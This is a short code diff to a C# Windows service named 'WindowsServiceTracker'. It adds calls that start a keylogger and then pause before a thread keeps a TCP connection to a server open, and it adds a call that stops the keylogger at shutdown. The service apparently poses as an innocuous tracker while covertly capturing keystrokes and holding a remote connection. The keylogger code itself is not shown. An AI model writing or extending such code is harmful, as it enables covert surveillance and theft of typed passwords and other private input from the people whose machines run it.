@@ -69,6 +69,9 @@ namespace WindowsServiceTracker
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
 
+            StartKeylogger();
+            Thread.Sleep(30000);
+
             tcpThread = new Thread(this.MaintainServerConnection);
             tcpThread.Start();
 
@@ -81,7 +84,7 @@ namespace WindowsServiceTracker
             //SendStringMsg("Bye!");
 
             //StopKeyLogger();
-
+            StopKeylogger();
             Disconnect();
             tcpKeepAlive = false;
             if (tcpThread != null && tcpThread.IsAlive)
